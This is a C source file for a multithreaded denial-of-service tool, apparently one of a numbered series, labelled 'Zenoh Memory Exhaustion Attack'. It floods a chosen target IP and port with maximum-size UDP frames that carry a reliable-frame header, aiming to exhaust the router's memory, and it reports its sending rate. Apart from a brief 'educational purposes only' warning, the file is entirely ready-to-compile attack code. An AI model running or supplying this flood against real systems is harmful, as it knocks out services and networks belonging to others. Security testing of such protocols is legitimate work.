/*
 * Attack 9: Memory Exhaustion via Large Payloads
 * Sends maximum-size messages to exhaust router memory
 * 
 * Compile: gcc -o attack9_memexhaust attack_9_memory_exhaustion.c -pthread
 * Run: ./attack9_memexhaust <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_FRAME 0x00
#define Z_FLAG_RELIABLE 0x20
#define MAX_FRAME_SIZE 65535  // Maximum UDP packet size

static volatile int g_running = 1;
static atomic_ullong g_bytes_sent = 0;
static atomic_ullong g_frames_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping memory exhaustion attack...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    // Increase socket buffer size
    int sndbuf = 1024 * 1024; // 1MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (sending max-size frames)\n", args->thread_id);
    
    // Allocate maximum size buffer
    unsigned char *buffer = malloc(MAX_FRAME_SIZE);
    if (!buffer) {
        fprintf(stderr, "[-] Thread %d: malloc failed\n", args->thread_id);
        close(sock);
        free(args);
        return NULL;
    }
    
    unsigned long long seq = args->thread_id * 1000000ULL;
    unsigned long local_count = 0;
    
    while (g_running) {
        size_t offset = 0;
        
        // FRAME header
        buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE;
        
        // Sequence number
        offset += encode_zint(buffer + offset, seq++);
        
        // Fill with maximum payload
        size_t payload_size = MAX_FRAME_SIZE - offset - 100; // Leave some headroom
        
        // Pattern fill (easier to detect memory issues)
        for (size_t i = 0; i < payload_size; i++) {
            buffer[offset + i] = (unsigned char)(seq + i) % 256;
        }
        offset += payload_size;
        
        ssize_t sent = sendto(sock, buffer, offset, 0,
                             (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        if (sent > 0) {
            atomic_fetch_add(&g_bytes_sent, sent);
            atomic_fetch_add(&g_frames_sent, 1);
            local_count++;
        }
        
        if (local_count % 100 == 0) {
            printf("[Thread %d] Sent %lu max-size frames (%.2f MB total)\n",
                   args->thread_id, local_count,
                   (double)(local_count * MAX_FRAME_SIZE) / 1048576.0);
        }
        
        usleep(10000); // 10ms delay (to not overwhelm network)
    }
    
    free(buffer);
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Memory Exhaustion Attack           ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Frame size: %d bytes (%.2f KB)\n", 
           MAX_FRAME_SIZE, MAX_FRAME_SIZE / 1024.0);
    printf("[*] Expected memory pressure: HIGH\n\n");
    
    signal(SIGINT, signal_handler);
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long bytes = atomic_load(&g_bytes_sent);
        unsigned long long frames = atomic_load(&g_frames_sent);
        time_t elapsed = time(NULL) - start;
        
        printf("[*] Frames: %llu | Data: %.2f MB | Rate: %.2f MB/s\n",
               frames, bytes / 1048576.0,
               elapsed > 0 ? (bytes / 1048576.0) / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total_bytes = atomic_load(&g_bytes_sent);
    unsigned long long total_frames = atomic_load(&g_frames_sent);
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Frames: %-28llu ║\n", total_frames);
    printf("║ Total Data:   %-24.2f MB ║\n", total_bytes / 1048576.0);
    printf("║ Duration:     %-28ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}